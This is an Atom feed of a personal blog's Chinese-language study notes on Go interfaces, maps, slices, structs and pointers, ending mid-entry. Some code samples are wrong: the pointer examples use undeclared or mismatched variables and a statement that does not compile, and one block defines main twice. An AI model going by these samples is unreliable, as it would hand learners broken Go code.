<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>LexLady</title>
  
  
  <link href="http://lexlady.top/atom.xml" rel="self"/>
  
  <link href="http://lexlady.top/"/>
  <updated>2024-04-22T12:53:02.141Z</updated>
  <id>http://lexlady.top/</id>
  
  <author>
    <name>Lexlady</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://lexlady.top/2024/04/22/Golang/go-interface/"/>
    <id>http://lexlady.top/2024/04/22/Golang/go-interface/</id>
    <published>2024-04-22T12:36:30.162Z</published>
    <updated>2024-04-22T12:53:02.141Z</updated>
    
    <content type="html"><![CDATA[<p>接口是一种数据类型：把所有共性的方法定义在一起，任何其他类型只要实现了这些方法就是实现了这个接口。</p><p>接口能够在一组公共的方法上绑定其他不同类型的数据，从而实现多态和更灵活的设计</p><p>接口在Go中是隐式实现的。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 定义接口</span><br><span class="hljs-keyword">type</span> interface_name <span class="hljs-keyword">interface</span> &#123;<br>    method1_name [return_type]<br>    method2_name []<br>    ...<br>&#125;<br><span class="hljs-comment">/* 定义结构体 */</span><br><span class="hljs-keyword">type</span> struct_name <span class="hljs-keyword">struct</span> &#123;<br>   <span class="hljs-comment">/* variables */</span><br>&#125;<br><br><span class="hljs-comment">/* 实现接口方法 */</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(struct_name_variable struct_name)</span></span> method1_name() [return_type] &#123;<br>   <span class="hljs-comment">/* 方法实现 */</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(struct_name_variable struct_name)</span></span> method2_name() [return_type] &#123;<br>   <span class="hljs-comment">/* 方法实现*/</span><br>&#125;<br>...<br></code></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><blockquote><p>接口类型变量可以存储任何实现了该接口的类型的值。</p></blockquote><h2 id="接口类型转换"><a href="#接口类型转换" class="headerlink" title="接口类型转换"></a>接口类型转换</h2><ol><li><p>类型断言<br>将接口类型转换为指定类型：<code>value.(type)</code>或<code>value.(T)</code></p><p>如果类型断言成功，它将返回转换后的值和一个布尔值，表示转换是否成功。</p></li><li><p>类型转换</p></li></ol><p>将一个接口类型的值转换为另一个接口类型：<code>T(value)</code></p><p>在类型转换中，我们必须保证要转换的值和目标接口类型之间是兼容的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-keyword">var</span> i <span class="hljs-keyword">interface</span>&#123;&#125; = <span class="hljs-string">&quot;Hello, World&quot;</span><br>   str, ok := i.(<span class="hljs-type">string</span>)<br>   <span class="hljs-keyword">if</span> ok &#123;<br>      fmt.Printf(<span class="hljs-string">&quot;&#x27;%s&#x27; is a string\n&quot;</span>, str)<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      fmt.Println(<span class="hljs-string">&quot;conversion failed&quot;</span>)<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">// 例二</span><br><span class="hljs-keyword">type</span> Writer <span class="hljs-keyword">interface</span> &#123;<br>    Write([]<span class="hljs-type">byte</span>) (<span class="hljs-type">int</span>, <span class="hljs-type">error</span>)<br>&#125;<br><br><span class="hljs-keyword">type</span> StringWriter <span class="hljs-keyword">struct</span> &#123;<br>    str <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(sw *StringWriter)</span></span> Write(data []<span class="hljs-type">byte</span>) (<span class="hljs-type">int</span>, <span class="hljs-type">error</span>) &#123;<br>    sw.str += <span class="hljs-type">string</span>(data)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(data), <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">var</span> w Writer = &amp;StringWriter&#123;&#125;<br>    sw := w.(*StringWriter)<br>    sw.str = <span class="hljs-string">&quot;Hello, World&quot;</span><br>    fmt.Println(sw.str)<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;接口是一种数据类型：把所有共性的方法定义在一起，任何其他类型只要实现了这些方法就是实现了这个接口。&lt;/p&gt;
&lt;p&gt;接口能够在一组公共的方法上绑定其他不同类型的数据，从而实现多态和更灵活的设计&lt;/p&gt;
&lt;p&gt;接口在Go中是隐式实现的。&lt;/p&gt;
&lt;h2 id=&quot;示例&quot;&gt;&lt;a h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://lexlady.top/2024/04/22/Golang/go-map/"/>
    <id>http://lexlady.top/2024/04/22/Golang/go-map/</id>
    <published>2024-04-22T12:34:36.326Z</published>
    <updated>2024-04-22T12:34:39.346Z</updated>
    
    <content type="html"><![CDATA[<h2 id="定义Map"><a href="#定义Map" class="headerlink" title="定义Map"></a>定义Map</h2><ol><li>make函数</li></ol><p><code>map := make(map[KeyType]ValueType, cap)</code><br>2. map关键字</p><p><code> m := map[string]int&#123;&quot;apple&quot;: 1, &quot;banana&quot;:2&#125;</code></p><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-keyword">var</span> siteMap <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span> <span class="hljs-comment">/*创建集合 */</span><br>   siteMap = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>)<br><br>   <span class="hljs-comment">/* map 插入 key - value 对,各个国家对应的首都 */</span><br>   siteMap [ <span class="hljs-string">&quot;Google&quot;</span> ] = <span class="hljs-string">&quot;谷歌&quot;</span><br>   siteMap [ <span class="hljs-string">&quot;Runoob&quot;</span> ] = <span class="hljs-string">&quot;菜鸟教程&quot;</span><br>   siteMap [ <span class="hljs-string">&quot;Baidu&quot;</span> ] = <span class="hljs-string">&quot;百度&quot;</span><br>   siteMap [ <span class="hljs-string">&quot;Wiki&quot;</span> ] = <span class="hljs-string">&quot;维基百科&quot;</span><br><br>   <span class="hljs-comment">// 遍历Map</span><br>   <span class="hljs-keyword">for</span> site := <span class="hljs-keyword">range</span> siteMap &#123;<br>      fmt.Println(site, <span class="hljs-string">&quot;首都是&quot;</span>, siteMap [site])<br>   &#125;<br><br>   <span class="hljs-comment">// 获取元素</span><br>   v1 := siteMap[ <span class="hljs-string">&quot;Google&quot;</span> ]<br><br>   <span class="hljs-comment">// 修改元素</span><br>   siteMap[ <span class="hljs-string">&quot;Wiki&quot;</span> ] = <span class="hljs-string">&quot;维基&quot;</span><br><br>   <span class="hljs-comment">// 获取Map的长度</span><br>   <span class="hljs-built_in">len</span> := <span class="hljs-built_in">len</span>(siteMap)<br><br>   <span class="hljs-comment">/*查看元素在集合中是否存在 */</span><br>   name, ok := siteMap [ <span class="hljs-string">&quot;Facebook&quot;</span> ] <span class="hljs-comment">/*如果确定是真实的,则存在,否则不存在 */</span><br>   <span class="hljs-comment">/*fmt.Println(capital) */</span><br>   <span class="hljs-comment">/*fmt.Println(ok) */</span><br>   <span class="hljs-keyword">if</span> (ok) &#123;<br>      fmt.Println(<span class="hljs-string">&quot;Facebook 的 站点是&quot;</span>, name)<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      fmt.Println(<span class="hljs-string">&quot;Facebook 站点不存在&quot;</span>)<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="delete-函数"><a href="#delete-函数" class="headerlink" title="delete()函数"></a>delete()函数</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-comment">/* 创建map */</span><br>   countryCapitalMap := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;France&quot;</span>: <span class="hljs-string">&quot;Paris&quot;</span>, <span class="hljs-string">&quot;Italy&quot;</span>: <span class="hljs-string">&quot;Rome&quot;</span>, <span class="hljs-string">&quot;Japan&quot;</span>: <span class="hljs-string">&quot;Tokyo&quot;</span>, <span class="hljs-string">&quot;India&quot;</span>: <span class="hljs-string">&quot;New delhi&quot;</span>&#125;<br><br>   fmt.Println(<span class="hljs-string">&quot;原始地图&quot;</span>)<br><br>   <span class="hljs-comment">/* 打印地图 */</span><br>   <span class="hljs-keyword">for</span> country := <span class="hljs-keyword">range</span> countryCapitalMap &#123;<br>      fmt.Println(country, <span class="hljs-string">&quot;首都是&quot;</span>, countryCapitalMap [ country ])<br>   &#125;<br><br>   <span class="hljs-comment">/*删除元素*/</span> <br>   <span class="hljs-built_in">delete</span>(countryCapitalMap, <span class="hljs-string">&quot;France&quot;</span>)<br>   fmt.Println(<span class="hljs-string">&quot;法国条目被删除&quot;</span>)<br><br>   fmt.Println(<span class="hljs-string">&quot;删除元素后地图&quot;</span>)<br><br>   <span class="hljs-comment">/*打印地图*/</span><br>   <span class="hljs-keyword">for</span> country := <span class="hljs-keyword">range</span> countryCapitalMap &#123;<br>      fmt.Println(country, <span class="hljs-string">&quot;首都是&quot;</span>, countryCapitalMap [ country ])<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;定义Map&quot;&gt;&lt;a href=&quot;#定义Map&quot; class=&quot;headerlink&quot; title=&quot;定义Map&quot;&gt;&lt;/a&gt;定义Map&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;make函数&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;map := make(map[KeyType]V</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://lexlady.top/2024/04/21/Golang/go-slice/"/>
    <id>http://lexlady.top/2024/04/21/Golang/go-slice/</id>
    <published>2024-04-21T13:40:48.652Z</published>
    <updated>2024-04-22T12:23:28.645Z</updated>
    
    <content type="html"><![CDATA[<p>切片就是对数组的抽象，提供了一种更加灵活，功能强大的“动态数组”。</p><h2 id="定义切片"><a href="#定义切片" class="headerlink" title="定义切片"></a>定义切片</h2><ol><li>声明一个未指定大小的数组<br><code>var identifier []type</code></li><li>使用<code>make()</code>函数创建<br><code>var slice []type = make([]type, len)</code>或者通过内置函数<code>make()</code>初始化切片<code>s</code><br><code>s :=make([]int,len,cap)</code>,<code>[]int</code>标识为其元素类型为<code>int</code>的切片。<br><code>make()</code>函数这里容量可选</li></ol><h2 id="切片的初始化"><a href="#切片的初始化" class="headerlink" title="切片的初始化"></a>切片的初始化</h2><p>切片可以直接通过数组来初始化，也可以通过内置函数<code>make()</code>初始化。</p><p>初始化时默认<code>len=cap</code>，在追加元素时如果容量<code>cap</code>不足时将按<code>len的2</code>倍扩容。</p><p><code>s :=[] int &#123;1,2,3 &#125;</code>直接初始化切片，<code>[]</code>表示是切片类型，<code>&#123;1,2,3&#125;</code>初始化值依次是<code>1,2,3</code>。其<code>cap=len=3</code>。</p><p><code>s := arr[:]</code>初始化切片<code>s</code>，是数组<code>arr</code>的引用。</p><p><code>s := arr[startIndex:endIndex]</code>将<code>arr</code>中从下标<code>startIndex 到 endIndex-1</code>下的元素创建为一个新的切片。（不包含endIndex）</p><p><code>s := arr[startIndex:]</code>缺少<code>endIndex</code>时将表示一直到<code>arr</code>的最后一个元素。</p><p><code>s := arr[:endIndex]</code>缺少<code>startIndex</code>时将表示从<code>arr</code>的第一个元素开始。</p><p><code>s1 := s[startIndex:endIndex]</code>通过切片<code>s</code>初始化切片<code>s1</code></p><h2 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h2><table><thead><tr><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>len()</td><td>获取切片长度</td></tr><tr><td>cap()</td><td>切片最大容量</td></tr><tr><td>append()</td><td>追加元素</td></tr><tr><td>copy()</td><td>拷贝</td></tr></tbody></table><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   numbers := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>&#125;<br>   number1:=<span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>)<br>   number2:=numbers[:<span class="hljs-number">3</span>]<br>   number3:=numbers[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>   number4:=numbers[<span class="hljs-number">3</span>:<span class="hljs-number">8</span>]<br>   <span class="hljs-comment">// cap的大小与截取的位置有关</span><br>   <span class="hljs-comment">// number3 的 ptr 指向第三个元素，后面还剩8个元素所以cap=8</span><br>   <span class="hljs-comment">// number4 的 ptr 指向第四个元素，后面还剩7个元素所以cap=7</span><br>   printSlice(numbers)  <span class="hljs-comment">//len=10  cap=10 slice=[0 1 2 3 4 5 6 7 8 9]</span><br>   printSlice(number1)  <span class="hljs-comment">//len=0  cap=5 slice=[]</span><br>   printSlice(number2)  <span class="hljs-comment">//len=3  cap=10 slice=[0 1 2]</span><br>   printSlice(number3)  <span class="hljs-comment">//len=3  cap=8 slice=[2 3 4]</span><br>   printSlice(number4)  <span class="hljs-comment">//len=5  cap=7 slice=[3 4 5 6 7]</span><br><br>   <span class="hljs-comment">// append()</span><br><br>   <span class="hljs-comment">// 允许追加空切片</span><br>   numbers = <span class="hljs-built_in">append</span>(numbers, <span class="hljs-number">0</span>)<br><br>   <span class="hljs-comment">// 向切片添加一个或多个元素</span><br>   numbers = <span class="hljs-built_in">append</span>(numbers, <span class="hljs-number">11</span>,<span class="hljs-number">12</span>)<br><br>   <span class="hljs-comment">// copy()</span><br><br>   <span class="hljs-comment">// 创建切片newNumbers是之前切片的两倍</span><br>   newNumbers := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-built_in">len</span>(numbers), (<span class="hljs-built_in">cap</span>(numbers))*<span class="hljs-number">2</span>)<br>   <span class="hljs-built_in">copy</span>(newNumbers, numbers)<br>   printSlice(newNumbers)<br>   <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">printSlice</span><span class="hljs-params">(x []<span class="hljs-type">int</span>)</span></span> &#123;<br>   fmt.Printf(<span class="hljs-string">&quot;len=%d  cap=%d   slice=%v\n&quot;</span>,<span class="hljs-built_in">len</span>(x),<span class="hljs-built_in">cap</span>(x),x)<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;切片就是对数组的抽象，提供了一种更加灵活，功能强大的“动态数组”。&lt;/p&gt;
&lt;h2 id=&quot;定义切片&quot;&gt;&lt;a href=&quot;#定义切片&quot; class=&quot;headerlink&quot; title=&quot;定义切片&quot;&gt;&lt;/a&gt;定义切片&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;声明一个未指定大小的数组&lt;br</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://lexlady.top/2024/04/17/Golang/go-structure/"/>
    <id>http://lexlady.top/2024/04/17/Golang/go-structure/</id>
    <published>2024-04-17T13:11:37.172Z</published>
    <updated>2024-04-21T13:23:49.867Z</updated>
    
    <content type="html"><![CDATA[<p>结构体是有一系列具有相同类型或不同类型的数据构成的集合体。</p><h2 id="定义结构体"><a href="#定义结构体" class="headerlink" title="定义结构体"></a>定义结构体</h2><p><code>type</code>和<code>struct</code>的使用，<code>type</code>设定了结构体的名称，<code>struct</code>定义一个新的数据类型。格式如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> struct_variable <span class="hljs-keyword">struct</span> &#123;<br>    member definition<br>    member definition<br>    ...<br>    member definition<br>&#125;<br></code></pre></td></tr></table></figure><p>定义了结构体类型，它才能用于声明一个变量：</p><p><code>var name struct_variable&#123;value1, value2, value3, ...&#125;</code></p><p>或</p><p><code>var name struct_variable&#123; key1: value1, key2: value2, key3: value3, ...&#125;</code></p><h2 id="访问结构体成员"><a href="#访问结构体成员" class="headerlink" title="访问结构体成员"></a>访问结构体成员</h2><p>使用<code>.</code>操作符，格式为：</p><p><code>结构体.成员名</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><br></code></pre></td></tr></table></figure><h2 id="结构体指针"><a href="#结构体指针" class="headerlink" title="结构体指针"></a>结构体指针</h2><p>用于存储结构体变量的地址，查看、修改结构体变量的成员，同其他类型指针一样，在结构体变量前使用&amp;符合可以查看结构体变量地址。</p><h2 id="结构体作函数参数"><a href="#结构体作函数参数" class="headerlink" title="结构体作函数参数"></a>结构体作函数参数</h2><p>结构体可以像其他数据类型一样作为参数传递给函数，<strong>是值传递</strong>。</p><p>如果想在函数体内改变结构体内容，需要使用指针</p><blockquote><p>当要将结构体对象转换为 JSON 时，对象中的属性首字母必须是大写，才能正常转换为 JSON。（首字母大写相当于public，小写则相当于private。这个public，private是对于包而言）<br>可以使用tag标记要返回的字段名。</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;结构体是有一系列具有相同类型或不同类型的数据构成的集合体。&lt;/p&gt;
&lt;h2 id=&quot;定义结构体&quot;&gt;&lt;a href=&quot;#定义结构体&quot; class=&quot;headerlink&quot; title=&quot;定义结构体&quot;&gt;&lt;/a&gt;定义结构体&lt;/h2&gt;&lt;p&gt;&lt;code&gt;type&lt;/code&gt;和&lt;co</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://lexlady.top/2024/04/17/Golang/go-pointer/"/>
    <id>http://lexlady.top/2024/04/17/Golang/go-pointer/</id>
    <published>2024-04-17T13:07:53.683Z</published>
    <updated>2024-04-20T08:20:18.223Z</updated>
    
    <content type="html"><![CDATA[<p>在使用指针前你需要声明指针：<code>var name *type</code></p><p><code>type</code>为指针类型，<code>name</code>为指针变量名，<code>*</code>号用于指定变量是一个指针。</p><p>空指针：当一个指针被定义后没有分配到任何变量时，它的值为<code>nil</code></p><h2 id="指针数组"><a href="#指针数组" class="headerlink" title="指针数组"></a>指针数组</h2><p>存储数组的值：<code>var ptr [MAX]*int</code></p><p>ptr为整型指针数组，每个元素都指向了一个值：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go">numbers := [<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;<br><br><span class="hljs-keyword">var</span> ptrs [<span class="hljs-number">3</span>]*<span class="hljs-type">int</span><br><span class="hljs-keyword">for</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i ++ &#123;<br>    <span class="hljs-comment">// 把整数地址赋值给指针数组</span><br>    ptr[i] = &amp;numbers[i]<br>&#125;<br><br><span class="hljs-keyword">for</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++ &#123;<br>    fmt.Printf(<span class="hljs-string">&quot;numbers[%d] = %d\n&quot;</span>, i, *ptr[i])<br>&#125;<br><br><span class="hljs-comment">// numbers[0] = 1</span><br><span class="hljs-comment">// numbers[1] = 2</span><br><span class="hljs-comment">// numbers[2] = 3</span><br></code></pre></td></tr></table></figure><p>创建指针数组的时候，不应该用range循环</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go">number := [<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;<br><span class="hljs-keyword">var</span> ptrs [<span class="hljs-number">3</span>]*<span class="hljs-type">int</span><br><span class="hljs-comment">// 数组赋值</span><br><span class="hljs-keyword">for</span> i, x := <span class="hljs-keyword">range</span> &amp;number &#123;<br>    ptrs[i] &amp;x<br>&#125;<br><br><span class="hljs-keyword">for</span> i, x := <span class="hljs-keyword">range</span> ptrs &#123;<br>    fmt.Printf(<span class="hljs-string">&quot;指针数组：index:%d value:%d\n&quot;</span>, i, *x)<br>&#125;<br><br><span class="hljs-comment">// 指针数组：index:0 value:3</span><br><span class="hljs-comment">// 指针数组：index:1 value:3</span><br><span class="hljs-comment">// 指针数组：index:2 value:3</span><br></code></pre></td></tr></table></figure><blockquote><p>这个问题是range循环的实现逻辑引起的。跟for循环不一样的地方在于range循环中的x变量是临时变量，仅被声明一次，此后都是将迭代 number 出的值赋值给 x ， x 变量的内存地址始终未变，这样再将 x 的地址发送给 ptrs 数组，自然也是相同的。</p></blockquote><h2 id="指针的指针"><a href="#指针的指针" class="headerlink" title="指针的指针"></a>指针的指针</h2><p>如果一个指针变量存放的又是另一个指针变量的地址，则称这个指针变量为指向指针的指针变量。</p><p>当定义一个指向指针的指针变量时，第一个指针存放第二个指针的地址，第二个指针存放变量的地址：</p><p><code>var ptr **int</code>声明了一个指针的指针变量的整型</p><p>访问指向指针的指针变量值需要使用两个<code>*</code>号</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>   <span class="hljs-keyword">var</span> a <span class="hljs-type">int</span><br>   <span class="hljs-keyword">var</span> ptr *<span class="hljs-type">int</span><br>   <span class="hljs-keyword">var</span> pptr **<span class="hljs-type">int</span><br><br>   a = <span class="hljs-number">3000</span><br><br>   <span class="hljs-comment">/* 指针 ptr 地址 */</span><br>   ptr = &amp;a<br><br>   <span class="hljs-comment">/* 指向指针 ptr 地址 */</span><br>   pptr = &amp;ptr<br><br>   <span class="hljs-comment">/* 获取 pptr 的值 */</span><br>   fmt.Printf(<span class="hljs-string">&quot;变量 a = %d\n&quot;</span>, a )<br>   fmt.Printf(<span class="hljs-string">&quot;指针变量 *ptr = %d\n&quot;</span>, *ptr )<br>   fmt.Printf(<span class="hljs-string">&quot;指向指针的指针变量 **pptr = %d\n&quot;</span>, **pptr)<br>&#125;<br></code></pre></td></tr></table></figure><p>多级指针本质上就是一个指针链。可以通过下面的方法输出验证：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">var</span> p3 ***<span class="hljs-type">int</span> = &amp;pptr<br>    fmt.Printf(<span class="hljs-string">&quot;一级指针ptr的值：%d，ptr的目标地址：%d\n&quot;</span>, ptr , *ptr)<br>    fmt.Printf(<span class="hljs-string">&quot;二级指针pptr的值：%d，pptr的目标地址：%d，pptr的链尾目标地址：%d\n&quot;</span>, pptr , *pptr, **pptr)<br>    fmt.Printf(<span 